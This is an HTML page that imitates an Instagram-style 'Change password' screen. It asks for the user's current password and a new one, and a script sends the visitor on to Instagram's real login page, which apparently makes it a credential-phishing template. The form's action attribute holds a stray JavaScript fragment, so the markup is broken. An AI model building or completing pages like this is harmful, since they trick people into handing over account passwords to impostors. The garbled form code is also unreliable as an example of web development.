<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Change Password</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(to bottom right, #f5f7fa, #e8ebf0);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #fff;
      width: 360px;
      padding: 20px;
      border-radius: 14px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
    }

    h2 {
      margin-bottom: 10px;
      font-size: 22px;
    }

    p {
      font-size: 13px;
      color: #555;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 25px;
      background: #1877f2;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #145dbf;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Change password</h2>
  <p>
    Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (! $ @ &).
  </p>

  <!-- REAL FORM SUBMISSION -->
  <form method="POST" action="window.location.href = "https://www.instagram.com/accounts/login/";
    }
">

    <div class="input-group">
      <input type="password" name="current_password" placeholder="Current password" required>
    </div>

    <div class="input-group">
      <input type="password" name="new_password" placeholder="New password" required>
    </div>

    <div class="input-group">
      <input type="password" name="confirm_password" placeholder="Retype new password" required>
    </div>

    <button type="submit">Change Password</button>
 <script>
    function redirectToLogin() {
      // Redirect to Instagram login page
      window.location.href = "https://www.instagram.com/accounts/login/";
    }
  </script>


  </form>
</div>

</body>
</html>
